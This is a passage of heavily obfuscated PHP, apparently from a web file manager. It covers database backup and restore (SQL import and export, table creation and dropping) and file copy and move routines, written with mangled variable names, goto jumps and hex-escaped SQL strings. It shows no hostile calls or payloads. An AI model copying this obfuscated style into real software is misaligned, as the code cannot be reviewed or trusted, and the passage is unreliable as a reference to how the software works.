($BƒÊòÇÔ™[$DöÑªÖ¯©[754]] == $DöÑªÖ¯©[755]) { $BƒÊòÇÔ™[$DöÑªÖ¯©[756]] .= $DöÑªÖ¯©[1017] . $BÒ‰›Åœô™; } goto c ñÈîøäé; A”õ…ˆäŞ¼: $BÒ‰›Åœô™ = $BƒÊòÇÔ™[$DöÑªÖ¯©[929]]; $BƒÊòÇÔ™[$DöÑªÖ¯©[929]] = $DöÑªÖ¯©[33]; if ($BƒÊòÇÔ™[$DöÑªÖ¯©[754]] == $DöÑªÖ¯©[755]) { $e÷Ì½†±Ö© = $BƒÊòÇÔ™[$DöÑªÖ¯©[756]]; $BƒÊòÇÔ™[$DöÑªÖ¯©[756]] = substr($e÷Ì½†±Ö©, 0, strrpos($e÷Ì½†±Ö©, $DöÑªÖ¯©[1017])); } goto F‘Ú‡ïÛ‡; c·µÒÚø£Ã: $DöÑªÖ¯© =& $_SERVER[œº]; $BƒÊòÇÔ™ = array_change_key_case($this->database); if ($this->type == $DöÑªÖ¯©[9] || !$EÚùõ‹Õ¸å) { return $this->model()->db(); } goto A”õ…ˆäŞ¼; c ñÈîøäé: $this->database = $BƒÊòÇÔ™; $bé¥ø‰ŠéÚ->execute("\x75\x73\145\40\140{$BÒ‰›Åœô™}\x60"); return $bé¥ø‰ŠéÚ; goto D£ßò¹ğÊø; F‘Ú‡ïÛ‡: $this->database = $BƒÊòÇÔ™; $bé¥ø‰ŠéÚ = $this->model()->db(); try { $c‘Í•®ò”– = $bé¥ø‰ŠéÚ->execute("\163\x68\x6f\167\40\x64\141\164\x61\142\x61\x73\145\163\40\x6c\151\x6b\145\x20\x27{$BÒ‰›Åœô™}\47"); } catch (Exception $a”ìø­äÙ×) { } goto aÆ ×ö¤‰; D£ßò¹ğÊø: } public function createTable($Fä·»íá§«, $Aø é¸ÚëÀ = null) { $cìÙ†ÙÑô =& $_SERVER[œº]; if (!IO::exist($Fä·»íá§«)) { ActionCall($cìÙ†ÙÑô[1018], !0, 0); show_json(LNG($cìÙ†ÙÑô[1019]), !1); } $a½¸Ä‘³“ë = sqlSplit(IO::getContent($Fä·»íá§«)); foreach ($a½¸Ä‘³“ë as $fÂÛÃ¡Œï) { if ($Aø é¸ÚëÀ) { $CŒ‹Ğñ²†ç = stripos($fÂÛÃ¡Œï, $cìÙ†ÙÑô[1020]) === 0; if ($CŒ‹Ğñ²†ç) { $Aø é¸ÚëÀ->task[$cìÙ†ÙÑô[1021]] += 1; } } $this->model()->db()->execute($fÂÛÃ¡Œï); if ($Aø é¸ÚëÀ && $CŒ‹Ğñ²†ç) { preg_match($cìÙ†ÙÑô[1022], $fÂÛÃ¡Œï, $cÓí“¸ƒŞŞ); $Aø é¸ÚëÀ->task[$cìÙ†ÙÑô[1023]] = $cÓí“¸ƒŞŞ[1]; $Aø é¸ÚëÀ->update(1); } } $this->taskToCache($Aø é¸ÚëÀ); } public function insertTable($c§Ëø¸ó¦Ü, $B´ÃÔĞÉ = null) { $C’˜Àé±é‡ =& $_SERVER[œº]; $E‘½æâ½ëë = $this->model()->db(); $CéßƒÛ˜Îä = $dÛƒ…‰¦Œ‚ ? array($dÛƒ…‰¦Œ‚) : $E‘½æâ½ëë->getTables(); foreach ($c§Ëø¸ó¦Ü as $c›¡†¢ñ) { $dÛƒ…‰¦Œ‚ = basename($c›¡†¢ñ, $C’˜Àé±é‡[746]); if (!in_array($dÛƒ…‰¦Œ‚, $CéßƒÛ˜Îä)) { continue; } if ($B´ÃÔĞÉ) { $B´ÃÔĞÉ->task[$C’˜Àé±é‡[1023]] = $dÛƒ…‰¦Œ‚; } if (get_filesize($c›¡†¢ñ) == 0) { continue; } $a–˜½ä¾Ş° = $this->sqlToDb($c›¡†¢ñ, $B´ÃÔĞÉ); if (!$a–˜½ä¾Ş°) { ActionCall($C’˜Àé±é‡[1018], !0, 0); show_json(LNG($C’˜Àé±é‡[1024]) . "\x5b{$dÛƒ…‰¦Œ‚}\x5d", !1); } } $this->taskToCache($B´ÃÔĞÉ); } public function sqlFromDb($AËøÛç¹¤, $Aôôœ¡®ó, $d‚ä°Ş» = null, $fÏŒ¼œ´Œ‹ = null) { goto C‡ÉÚ¡…Ä‘; C‡ÉÚ¡…Ä‘: if ($d‚ä°Ş») { $d‚ä°Ş»->task[$_SERVER[œº][1023]] = $AËøÛç¹¤; } $dŒ÷ŞÓÇ = $this->model($AËøÛç¹¤); $d¡ğŞ†²Öô = 0; goto eñ¯É¯Ì‡®; aÈºŒ¼†: fclose($c‡ø»ßÌ); return $d¡ğŞ†²Öô; goto fÇÕİâµö«; A³„ƒÎ­‘î: $fÏ¿˜œÃ«ç = $dŒ÷ŞÓÇ->getPk(); $cëˆ‹—“Î = $dŒ÷ŞÓÇ->getDbFields(); do { $dƒå‘»±ÏÎ = array($fÏ¿˜œÃ«ç => array($_SERVER[œº][971], $A„–÷ô©ö‘)); $a‚‡„³Âñ‚ = $dŒ÷ŞÓÇ->where($dƒå‘»±ÏÎ)->field($cëˆ‹—“Î)->order($fÏ¿˜œÃ«ç . $_SERVER[œº][1026])->limit($C’¼¸µß…ˆ)->select(); $a‚‡„³Âñ‚ = !empty($a‚‡„³Âñ‚) ? $a‚‡„³Âñ‚ : array(); if (!($DŒ·‘Àæ½Å = count($a‚‡„³Âñ‚))) { break; } $AĞšì±‹Ÿ = end($a‚‡„³Âñ‚); $A„–÷ô©ö‘ = $AĞšì±‹Ÿ[$fÏ¿˜œÃ«ç]; $dÄöè…Ü„È = array(); foreach ($a‚‡„³Âñ‚ as $AÅÎà§‚Ò) { if ($AËøÛç¹¤ == $_SERVER[œº][1027] && $AÅÎà§‚Ò[$_SERVER[œº][29]] == $_SERVER[œº][1028]) { $fßÃÁÌ¨øå = json_decode($AÅÎà§‚Ò[$_SERVER[œº][372]], !0); if ($fßÃÁÌ¨øå[$_SERVER[œº][28]] == date($_SERVER[œº][711]) && !$fßÃÁÌ¨øå[$_SERVER[œº][710]]) { continue; } } if ($fÏŒ¼œ´Œ‹) { $AÅÎà§‚Ò[$_SERVER[œº][76]] = "\x7b\151\157\x3a{$fÏŒ¼œ´Œ‹}\x7d" . substr($AÅÎà§‚Ò[$_SERVER[œº][76]], strlen("\173\151\x6f\x3a{$AÅÎà§‚Ò[$_SERVER[œº][782]]}\x7d")); $AÅÎà§‚Ò[$_SERVER[œº][782]] = $fÏŒ¼œ´Œ‹; } $dÄöè…Ü„È[] = $_SERVER[œº][1029] . $this->sqlEncode($AÅÎà§‚Ò) . $_SERVER[œº][1030]; } $C±äò‡âÙ„ = "\111\116\x53\x45\122\x54\40\111\x4e\x54\x4f\40\140{$AËøÛç¹¤}\x60\x20\x28\140" . implode($_SERVER[œº][1031], $cëˆ‹—“Î) . $_SERVER[œº][1032]; fwrite($c‡ø»ßÌ, $C±äò‡âÙ„ . implode($_SERVER[œº][1033], $dÄöè…Ü„È) . $_SERVER[œº][68] . PHP_EOL); $d¡ğŞ†²Öô += $DŒ·‘Àæ½Å; if ($d‚ä°Ş») { $d‚ä°Ş»->update($DŒ·‘Àæ½Å); } } while ($C’¼¸µß…ˆ == $DŒ·‘Àæ½Å); goto aÈºŒ¼†; eñ¯É¯Ì‡®: $A„–÷ô©ö‘ = 0; $C’¼¸µß…ˆ = 10000; $c‡ø»ßÌ = fopen($Aôôœ¡®ó, $_SERVER[œº][1025]); goto A³„ƒÎ­‘î; fÇÕİâµö«: } public function sqlToDb($Dì±ğÅ´ç, $bªÛËÃªßÓ = null) { goto C†ĞÑÀá°Ğ; Fİ‹²Œâİ: if (!empty($bªòÔ¦í—)) { $E¤¬’ºŒˆë = $dÔáãƒÇ— . implode($AËœƒÒãˆ¦[47], $bªòÔ¦í—); if (!$B÷®ˆõÜ†õ->execute($E¤¬’ºŒˆë)) { return !1; } if ($bªÛËÃªßÓ) { $bªÛËÃªßÓ->update($C«÷™ÓôÄ); } } return !0; goto cï‰µ³Íƒ„; Eì™œç¤õË: if (!$a¹™ˆ•µÊ ) { return !1; } $C«÷™ÓôÄ = 0; $dÔáãƒÇ— = $AËœƒÒãˆ¦[33]; goto AèÊ›ŒØéñ; AèÊ›ŒØéñ: $bªòÔ¦í— = array(); $F¼³Ùêˆ»£ = $this->type == $AËœƒÒãˆ¦[9] ? 500 : 2000; $cÀ‹†‰µä˜ = basename($Dì±ğÅ´ç, $AËœƒÒãˆ¦[746]); goto D°ß–ïğ¸‘; C†ĞÑÀá°Ğ: $AËœƒÒãˆ¦ =& $_SERVER[œº]; $B÷®ˆõÜ†õ = $this->model()->db(); $a¹™ˆ•µÊ  = @fopen($Dì±ğÅ´ç, $AËœƒÒãˆ¦[1034]); goto Eì™œç¤õË; D°ß–ïğ¸‘: if ($cÀ‹†‰µä˜ == $AËœƒÒãˆ¦[1035]) { $F¼³Ùêˆ»£ = 50; } while (!feof($a¹™ˆ•µÊ )) { $BÖÂÒ£½¦¥ = trim(fgets($a¹™ˆ•µÊ )); if (!$BÖÂÒ£½¦¥) { continue; } $E¤¬’ºŒˆë = $this->sqlDecode($BÖÂÒ£½¦¥, $this->type); if (stripos($E¤¬’ºŒˆë, $AËœƒÒãˆ¦[355]) === 0) { if (!$dÔáãƒÇ—) { $dÔáãƒÇ— = $E¤¬’ºŒˆë . $AËœƒÒãˆ¦[50]; } continue; } if ($bªÛËÃªßÓ) { $bªÛËÃªßÓ->task[$AËœƒÒãˆ¦[1021]] += 1; } $C«÷™ÓôÄ++; $bªòÔ¦í—[] = rtrim(rtrim(trim($E¤¬’ºŒˆë), $AËœƒÒãˆ¦[47]), $AËœƒÒãˆ¦[68]); if ($C«÷™ÓôÄ >= $F¼³Ùêˆ»£) { $E¤¬’ºŒˆë = $dÔáãƒÇ— . implode($AËœƒÒãˆ¦[47], $bªòÔ¦í—); if (!$B÷®ˆõÜ†õ->execute($E¤¬’ºŒˆë)) { return !1; } if ($bªÛËÃªßÓ) { $bªÛËÃªßÓ->update($C«÷™ÓôÄ); } $bªòÔ¦í— = array(); $C«÷™ÓôÄ = 0; } } fclose($a¹™ˆ•µÊ ); goto Fİ‹²Œâİ; cï‰µ³Íƒ„: } public function dropTable($f­¸¦É– = null) { $EÜ– èÌƒ = $this->model()->db(); $F®İñÃäÕ = $f­¸¦É– ? array($f­¸¦É–) : $EÜ– èÌƒ->getTables(); if (!$F®İñÃäÕ) { return; } foreach ($F®İñÃäÕ as $f­¸¦É–) { $EÜ– èÌƒ->execute("\144\162\x6f\x70\40\164\141\142\154\145\x20\151\x66\40\145\170\151\x73\164\163\40\140{$f­¸¦É–}\140"); } } private function taskToCache($aĞéä•”Ú¡ = null) { $DÛÈØ¶Á° =& $_SERVER[œº]; if (!$aĞéä•”Ú¡) { return; } $dàë´²Ñ = array($DÛÈØ¶Á°[1023] => $aĞéä•”Ú¡->task[$DÛÈØ¶Á°[1023]], $DÛÈØ¶Á°[1021] => $aĞéä•”Ú¡->task[$DÛÈØ¶Á°[1021]], $DÛÈØ¶Á°[1036] => $aĞéä•”Ú¡->task[$DÛÈØ¶Á°[1036]]); if ($dàë´²Ñ[$DÛÈØ¶Á°[1021]] == $dàë´²Ñ[$DÛÈØ¶Á°[1036]]) { $dàë´²Ñ[$DÛÈØ¶Á°[720]] = 1; } Cache::set($DÛÈØ¶Á°[1037] . $aĞéä•”Ú¡->task[$DÛÈØ¶Á°[393]], $dàë´²Ñ); $aĞéä•”Ú¡->end(); } private function sqlEncode($BŠäÃÚ·Š‘) { $c±Ïº¾±×‚ =& $_SERVER[œº]; $B¼õÀˆØ« = array(); foreach ($BŠäÃÚ·Š‘ as $a»¢ˆ»“ö) { if (is_array($a»¢ˆ»“ö)) { $a»¢ˆ»“ö = json_encode_force($a»¢ˆ»“ö); } $a»¢ˆ»“ö = addslashes($a»¢ˆ»“ö); $a»¢ˆ»“ö = str_replace(array($c±Ïº¾±×‚[1038], $c±Ïº¾±×‚[229]), array($c±Ïº¾±×‚[1039], $c±Ïº¾±×‚[1040]), $a»¢ˆ»“ö); $B¼õÀˆØ«[] = str_replace($c±Ïº¾±×‚[55], $c±Ïº¾±×‚[1041], $a»¢ˆ»“ö); } return $c±Ïº¾±×‚[55] . implode($c±Ïº¾±×‚[1042], $B¼õÀˆØ«) . $c±Ïº¾±×‚[55]; } private function sqlDecode($eè’‹¶Š²Ê, $D­µÑ‰ùŠˆ) { $d¯‘˜­®ª =& $_SERVER[œº]; $eè’‹¶Š²Ê = str_replace(array($d¯‘˜­®ª[1039], $d¯‘˜­®ª[1040]), array($d¯‘˜­®ª[1038], $d¯‘˜­®ª[229]), $eè’‹¶Š²Ê); if ($D­µÑ‰ùŠˆ == $d¯‘˜­®ª[9]) { $eè’‹¶Š²Ê = stripslashes($eè’‹¶Š²Ê); } return $eè’‹¶Š²Ê; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($CÆÏ¨›éš, $bÆğÍÆÍà) { goto AÊš¹Ü……‘; AÊš¹Ü……‘: $b¼·É÷Ó¡ =& $_SERVER[œº]; $d½¤´‡ò‡ = $bÆğÍÆÍà; $GLOBALS[$b¼·É÷Ó¡[1043]] = $b¼·É÷Ó¡[1044] . $CÆÏ¨›éš; goto B·è½æã–Î; Díø³§ëÇ: Hook::trigger($b¼·É÷Ó¡[1044] . $CÆÏ¨›éš . $b¼·É÷Ó¡[1047], $d½¤´‡ò‡, $eè ËÂ²ù¾); return $eè ËÂ²ù¾; goto C‚¶ßÆéå; B·è½æã–Î: Hook::trigger($b¼·É÷Ó¡[1044] . $CÆÏ¨›éš . $b¼·É÷Ó¡[1045], $d½¤´‡ò‡); $b ä·›¤·¶ = self::driverMake($bÆğÍÆÍà[0]); if (method_exists($b ä·›¤·¶, $CÆÏ¨›éš)) { $eè ËÂ²ù¾ = @call_user_func_array(array($b ä·›¤·¶, $CÆÏ¨›éš), $bÆğÍÆÍà); } else { if (method_exists($b ä·›¤·¶, $b¼·É÷Ó¡[1046])) { $eè ËÂ²ù¾ = @call_user_func_array(array($b ä·›¤·¶, $CÆÏ¨›éš), $bÆğÍÆÍà); } else { if (method_exists(self, $CÆÏ¨›éš)) { $eè ËÂ²ù¾ = @call_user_func_array(array(self, $CÆÏ¨›éš), $bÆğÍÆÍà); } else { $eè ËÂ²ù¾ = call_user_func_array(array(parent, $CÆÏ¨›éš), $bÆğÍÆÍà); } } } goto Díø³§ëÇ; C‚¶ßÆéå: } public static function init($e²ŒŸÖé„ù) { return self::driverMake($e²ŒŸÖé„ù); } public static function copy($c‡Â™ß¹óÄ, $a…ùâ‰„, $c•ëÊé®¯­ = false, $fæŸ˜šØ¡± = false) { return self::copyMoveStart($c‡Â™ß¹óÄ, $a…ùâ‰„, $c•ëÊé®¯­, $_SERVER[œº][518], $fæŸ˜šØ¡±); } public static function move($Eƒ…„§ˆ™ê, $bÒ…ÛÄëí, $E¤ç†êÆ¢Ò = false, $BŒÈ™çµçó = false) { return self::copyMoveStart($Eƒ…„§ˆ™ê, $bÒ…ÛÄëí, $E¤ç†êÆ¢Ò, $_SERVER[œº][520], $BŒÈ™çµçó); } private static function copyMoveStart($fº¬‰¯¤µ, $E¥‚Çëß¢ê, $d¾œÙ§Áø¸, $bƒŒä¼¸…, $aöõÑµÈ÷à) { $c¸ƒ¬ÅÀìÇ =& $_SERVER[œº]; $c²”’»Œçä = array($fº¬‰¯¤µ, $E¥‚Çëß¢ê, $d¾œÙ§Áø¸, $aöõÑµÈ÷à); Hook::trigger($c¸ƒ¬ÅÀìÇ[1044] . $bƒŒä¼¸… . $c¸ƒ¬ÅÀìÇ[1045], $c²”’»Œçä); $fÛç–ñ ¡õ = self::copyMove($fº¬‰¯¤µ, $E¥‚Çëß¢ê, $d¾œÙ§Áø¸, $bƒŒä¼¸…, $aöõÑµÈ÷à); Hook::trigger($c¸ƒ¬ÅÀìÇ[1044] . $bƒŒä¼¸… . $c¸ƒ¬ÅÀìÇ[1047], $c²”’»Œçä, $fÛç–ñ ¡õ); return $fÛç–ñ ¡õ; } public static function saveFile($e¡ÁŒãŞš, $E÷ÃÔò»—«, $e…–Îäïè = true) { goto Cƒå¤ ¡; aà¾È£µŒ¯: $C›‘çøÉÛé = self::copyFile($e®ó¿—”Ùñ, $e¡ÁŒãŞš, $DÏß Ô®óñ, $AÇâ¾˜æ»ª, $e“«»—Õ[$C«È»İõ¥À[28]], $a·ŠĞ›í”Á); if ($fèæÍŒ—ƒ¿) { $C›‘çøÉÛé = $fèæÍŒ—ƒ¿->getPathOuter($C›‘çøÉÛé); } return $C›‘çøÉÛé; goto E‡È´ŒÓ¸; E·ßŒ÷™í”: $DÏß Ô®óñ = self::driverMake($E÷ÃÔò»—«); $fèæÍŒ—ƒ¿ = !1; if ($DÏß Ô®óñ->pathParse[$C«È»İõ¥À[1048]]) { $dÓ÷¶Á† = $DÏß Ô®óñ->pathParse[$C«È»İõ¥À[1048]]; $fèæÍŒ—ƒ¿ = $DÏß Ô®óñ; $DÏß Ô®óñ = self::driverMake($dÓ÷¶Á†); } goto Cà§ßöì´°; Cà§ßöì´°: $AÇâ¾˜æ»ª = $DÏß Ô®óñ->pathFather($E÷ÃÔò»—«); $a·ŠĞ›í”Á = !0; if (!$e…–Îäïè && self::driverIsSame($e®ó¿—”Ùñ, $DÏß Ô®óñ)) { $a·ŠĞ›í”Á = !1; } goto aà¾È£µŒ¯; Cƒå¤ ¡: $C«È»İõ¥À =& $_SERVER[œº]; $e“«»—Õ = self::info($E÷ÃÔò»—«); $e®ó¿—”Ùñ = self::driverMake($e¡ÁŒãŞš); goto E·ßŒ÷™í”; E‡È´ŒÓ¸: } private static function copyMove($f’ºä©åš, $Bšï´áôê, $F§—‰£—À¥, $eÏ‰²ƒÉ¹Â, $Bî‰Ãß·œ = false) { goto Bãğš©©µ©; b›¥„ÅˆÕƒ: Hook::trigger($cÄ¦©šÁ›[73], $eìôœéÚÓ”, $f’ºä©åš, $AÃ±åñÌ‘, $Bšï´áôê); $A©”¦Ø«ßÌ = self::driverIsSame($eìôœéÚÓ”, $AÃ±åñÌ‘); if ($A©”¦Ø«ßÌ) { if ($eÏ‰²ƒÉ¹Â == $cÄ¦©šÁ›[520] && !method_exists($AÃ±åñÌ‘, $cÄ¦©šÁ›[1049]) && trim($Bšï´áôê, $cÄ¦©šÁ›[8]) == trim($AÃ±åñÌ‘->pathFather($f’ºä©åš), $cÄ¦©šÁ›[8])) { if ($eìôœéÚÓ”->pathThis($f’ºä©åš) != $Bî‰Ãß·œ && !$eìôœéÚÓ”->isTypeObject()) { return $eìôœéÚÓ”->rename($f’ºä©åš, $Bî‰Ãß·œ); } return $AÃ±åñÌ‘->getPathOuter($f’ºä©åš); } if (method_exists($AÃ±åñÌ‘, $eÏ‰²ƒÉ¹Â)) { return $AÃ±åñÌ‘->{$eÏ‰²ƒÉ¹Â}($f’ºä©åš, $Bšï´áôê, $F§—‰£—À¥); } } goto cŞÏÀŠÆµ; còƒŠÙ²—Û: if ($eˆ‡ùÉ×’É) { $fÃ‹˜Ù’¾÷ = $eˆ‡ùÉ×’É->getPathOuter($fÃ‹˜Ù’¾÷); } return $fÃ‹˜Ù’¾÷; goto FŒïµæ¼¥‘; Bãğš©©µ©: $cÄ¦©šÁ› =& $_SERVER[œº]; if (!$f’ºä©åš || $f’ºä©åš == $cÄ¦©šÁ›[8] || !$Bšï´áôê) { return !1; } ignore_timeout(); goto D·ù‘ÌÜ¤ƒ; cŞÏÀŠÆµ: $f“Õ®İ…³¯ = $eìôœéÚÓ”->isFile($f’ºä©åš); if (!$f“Õ®İ…³¯ && $AÃ±åñÌ‘->getType() == $cÄ¦©šÁ›[718] && $eìôœéÚÓ”->getType() == $cÄ¦©šÁ›[106]) { $fÃ‹˜Ù’¾÷ = $AÃ±åñÌ‘->copyFolderFromIO($eìôœéÚÓ”, $f’ºä©åš, $Bšï´áôê, $F§—‰£—À¥, $bè ² •§», $Bî‰Ãß·œ); } else { $fÃ‹˜Ù’¾÷ = self::copyPath($eìôœéÚÓ”, $f’ºä©åš, $AÃ±åñÌ‘, $Bšï´áôê, $F§—‰£—À¥, $bè ² •§», $f“Õ®İ…³¯, $Bî‰Ãß·œ); } if ($fÃ‹˜Ù’¾÷ && $bè ² •§») { $eìôœéÚÓ”->remove($f’ºä©åš); } goto còƒŠÙ²—Û; D·ù‘ÌÜ¤ƒ: $eìôœéÚÓ” = self::driverMake($f’ºä©åš); $AÃ±åñÌ‘ = self::driverMake($Bšï´áôê); $bè ² •§» = $eÏ‰²ƒÉ¹Â == $cÄ¦©šÁ›[520]; goto C´ŸÄÖˆµÄ; C´ŸÄÖˆµÄ: $eˆ‡ùÉ×’É = !1; if ($AÃ±åñÌ‘->pathParse[$cÄ¦©šÁ›[1048]]) { $Bšï´áôê = $AÃ±åñÌ‘->pathParse[$cÄ¦©šÁ›[1048]]; $eˆ‡ùÉ×’É = $AÃ±åñÌ‘; $AÃ±åñÌ‘ = self::driverMake($Bšï´áôê); } self::check($eìôœéÚÓ”, $f’ºä©åš, $AÃ±åñÌ‘, $Bšï´áôê); goto b›¥„ÅˆÕƒ; FŒïµæ¼¥‘: } private static function check($Dšêà¡ò¾ä, $f¢„½÷ÍÄÅ, $d’•„È—åà, &$c¼ñÅáœù¹) { $aÏøó´‡«è =& $_SERVER[œº]; if (self::driverIsSame($Dšêà¡ò¾ä, $d’•„È—åà) && $Dšêà¡ò¾ä->isFolder($f¢„½÷ÍÄÅ) && $Dšêà¡ò¾ä->isParentOf($f¢„½÷ÍÄÅ, $c¼ñÅáœù¹)) { show_json(LNG($aÏøó´‡«è[1050]), !1); } if (!$Dšêà¡ò¾ä->exist($f¢„½÷ÍÄÅ)) { show_json(LNG($aÏøó´‡«è[105]), !1); } } private static function copyPath($B‰²Œ³ÏÜ‹, $E•è£ñï², $c×Ô¦á­¼, $F¼ìÎÒ´§, $C¨¢·Ñ‹ˆÙ, $D…öñ‡…–Œ, $B®Ïôôäğ¯, $Döñåƒñ¼ä = false) { goto bùé¢ó‹­Ä; bùé¢ó‹­Ä: $Dä¨´²—ƒŠ =& $_SERVER[œº]; $f¸Š¦ïÛ× = empty($Döñåƒñ¼ä) && $Döñåƒñ¼ä !== $Dä¨´²—ƒŠ[191] ? $B‰²Œ³ÏÜ‹->pathThis($E•è£ñï²) : $Döñåƒñ¼ä; if ($C¨¢·Ñ‹ˆÙ) { $b´¾¿‡“®ç = $c×Ô¦á­¼->fileNameExist($F¼ìÎÒ´§, $f¸Š¦ïÛ×); $f¸Š¦ïÛ× = $c×Ô¦á­¼->fileNameAuto($F¼ìÎÒ´§, $f¸Š¦ïÛ×, $C¨¢·Ñ‹ˆÙ, !$B®Ïôôäğ¯); $C¨¢·Ñ‹ˆÙ = $b´¾¿‡“®ç ? $C¨¢·Ñ‹ˆÙ : !1; } goto e‰ùñ¾–°; E×ˆÜÊ®áŞ: $BÔéÚÌ©œ = is_array($BÔéÚÌ©œ) ? $BÔéÚÌ©œ : array($Dä¨´²—ƒŠ[74] => array(), $Dä¨´²—ƒŠ[75] => array()); $Eò¼œÚ¦Ú¡ = array_merge($BÔéÚÌ©œ[$Dä¨´²—ƒŠ[74]], $BÔéÚÌ©œ[$Dä¨´²—ƒŠ[75]]); foreach ($Eò¼œÚ¦Ú¡ as $d ñç¡ì´–) { $Cššİô‚‚Ï = $d ñç¡ì´–[$Dä¨´²—ƒŠ[29]] == $Dä¨´²—ƒŠ[193]; $E•è£ñï² = $B‰²Œ³ÏÜ‹->getPathInner($d ñç¡ì´–[$Dä¨´²—ƒŠ[76]]); $a‹…«Ìƒ = self::copyPath($B‰²Œ³ÏÜ‹, $E•è£ñï², $c×Ô¦á­¼, $F¼ìÎÒ´§, $C¨¢·Ñ‹ˆÙ, $D…öñ‡…–Œ, $Cššİô‚‚Ï); if (!$a‹…«Ìƒ) { IO::errorTips($Dä¨´²—ƒŠ[1051] . $E•è£ñï² . $Dä¨´²—ƒŠ[67] . $F¼ìÎÒ´§); } } goto câ°Ö“¾‡; a§ÙŸÚÇÂ: $D•Ğ‚‘”Œ = $c×Ô¦á­¼->mkdir($c×Ô¦á­¼->getPath($D‡ÈŞ†½Ì¢)); $F¼ìÎÒ´§ = $c×Ô¦á­¼->getPathInner($D•Ğ‚‘”Œ); $BÔéÚÌ©œ = $B‰²Œ³ÏÜ‹->listPath($E•è£ñï², !0); goto E×ˆÜÊ®áŞ; câ°Ö“¾‡: self::copyMoveKeepInfo($B‰²Œ³ÏÜ‹, $E•è£ñï², $D•Ğ‚‘”Œ); return $D•Ğ‚‘”Œ; goto bõŠ„´Ä×“; e‰ùñ¾–°: if ($B®Ïôôäğ¯) { return self::copyFile($B‰²Œ³ÏÜ‹, $E•è£ñï², $c×Ô¦á­¼, $F¼ìÎÒ´§, $f¸Š¦ïÛ×, $D…öñ‡…–Œ); } if ($C¨¢·Ñ‹ˆÙ == REPEAT_RENAME_FOLDER) { $C¨¢·Ñ‹ˆÙ = !1; } $D‡ÈŞ†½Ì¢ = rtrim($F¼ìÎÒ´§, $Dä¨´²—ƒŠ[8]) . $Dä¨´²—ƒŠ[8] . $f¸Š¦ïÛ×; goto a§ÙŸÚÇÂ; bõŠ„´Ä×“: } private static function copyFile($cò§‘Ú¦², $Eèƒà²ì, $bòÃƒš­’é, $A÷Ø½Åòâ‚, $F„İ·¨œÄ˜, $Cö·¼Ïƒá‹) { goto Fë‚ä™ğÚ¸; Fë‚ä™ğÚ¸: $a…ØìÕ„Î =& $_SERVER[œº]; $A÷Ø½Åòâ‚ = $bòÃƒš­’é->getPath(rtrim($A÷Ø½Åòâ‚, $a…ØìÕ„Î[8]) . $a…ØìÕ„Î[8] . $F„İ·¨œÄ˜); $d«İÒÂì = $a…ØìÕ„Î[1052] . time() . rand_string(5); goto BÕ‘èêîôí; FóïáĞ‡ù½: self::remove($F„¢Ÿ®Ù¾ô); Hook::trigger($a…ØìÕ„Î[1054], $cò§‘Ú¦², $Eèƒà²ì, $bòÃƒš­’é, $A÷Ø½Åòâ‚, $F„İ·¨œÄ˜, $dš—ô®÷Ë); self::copyMoveKeepInfo($cò§‘Ú¦², $Eèƒà²ì, $dš—ô®÷Ë); goto b§ÓÉõÙ‡; cÑÛ×öé‘Ô: $CĞÒŠˆÒ¼ç = $cò§‘Ú¦²->download($Eèƒà²ì, $CĞÒŠˆÒ¼ç); $CĞÒŠˆÒ¼ç = $cò§‘Ú¦²->iconvApp($CĞÒŠˆÒ¼ç); $dš—ô®÷Ë = $bòÃƒš­’é->upload($A÷Ø½Åòâ‚, $CĞÒŠˆÒ¼ç, $Cö·¼Ïƒá‹); goto FóïáĞ‡ù½; BÕ‘èêîôí: Hook::trigger($a…ØìÕ„Î[1053], $cò§‘Ú¦², $Eèƒà²ì, $bòÃƒš­’é, $A÷Ø½Åòâ‚, $F„İ·¨œÄ˜, $d«İÒÂì); if (self::driverIsSame($cò§‘Ú¦², $bòÃƒš­’é)) { if ($Cö·¼Ïƒá‹) { $dš—ô®÷Ë = $bòÃƒš­’é->moveFile($Eèƒà²ì, $A÷Ø½Åòâ‚); } else { $dš—ô®÷Ë = $bòÃƒš­’é->copyFile($Eèƒà²ì, $A÷Ø½Åòâ‚); } Hook::trigger($a…ØìÕ„Î[1054], $cò§‘Ú¦², $Eèƒà²ì, $bòÃƒš­’é, $A÷Ø½Åòâ‚, $F„İ·¨œÄ˜, $dš—ô®÷Ë); self::copyMoveKeepInfo($cò§‘Ú¦², $Eèƒà²ì, $dš—ô®÷Ë); return $dš—ô®÷Ë; } $e÷¨²­Ü°Ö = TEMP_FILES; goto däÊöï‹‚¿; däÊöï‹‚¿: if ($GLOBALS[$a…ØìÕ„Î[6]][$a…ØìÕ„Î[88]][$a…ØìÕ„Î[760]]) { $e÷¨²­Ü°Ö = $GLOBALS[$a…ØìÕ„Î[6]][$a…ØìÕ„Î[88]][$a…ØìÕ„Î[760]]; } $Cö·¼Ïƒá‹ = !0; $CŠŞŠ³¾äÜ = $e÷¨²­Ü°Ö; goto d½–¤Â”ôî; b§ÓÉõÙ‡: return $dš—ô®÷Ë; goto BÉÖËÑæõã; d½–¤Â”ôî: mk_dir($CŠŞŠ³¾äÜ); $CĞÒŠˆÒ¼ç = $CŠŞŠ³¾äÜ . $d«İÒÂì; $F„¢Ÿ®Ù¾ô = $CĞÒŠˆÒ¼ç; goto cÑÛ×öé‘Ô; BÉÖËÑæõã: } private static function copyMoveKeepInfo($Dè†î‡¡—·, $FÉÆÂ©‰¾, $Bğ²¸±½¾) { if (!$Bğ²¸±½¾) { return; } $EÕ÷ÙÔ«È» = $Dè†î‡¡—·->info($FÉÆÂ©‰¾); if (!is_array($EÕ÷ÙÔ«È»)) { return; } IO::setModifyTime($Bğ²¸±½¾, $EÕ÷ÙÔ«È»[$_SERVER[œº][84]]); } public static function pathFather($cŒâ¤ïŠÕ) { $D£š®•¶É = IO::init($cŒâ¤ïŠÕ); $aãˆùš†©» = $D£š®•¶É->pathFather($D£š®•¶É->path); return $D£š®•¶É->getPathOuter($aãˆùš†©»); } public static function fileOut($CÃ­Åİ…®¡, $AºÅ’£é«” = false, $e˜“†½ØÉ› = false, $BËßØÙƒÃÜ = '') { $Fè‹êªß›Î = self::driverMake($CÃ­Åİ…®¡); if ($Fè‹êªß›Î->isFileOutServer()) { return $Fè‹êªß›Î->fileOutServer($CÃ­Åİ…®¡, $AºÅ’£é«”, $e˜“†½ØÉ›, $BËßØÙƒÃÜ); } return $Fè‹êªß›Î->fileOut($CÃ­Åİ…®¡, $AºÅ’£é«”, $e˜“†½ØÉ›, $BËßØÙƒÃÜ); } public static function fileOutImage($e“ŸÖ¥×Ì, $e¿åÙ™È¿Ï = 250) { $eµÈ×Ê—„‡ 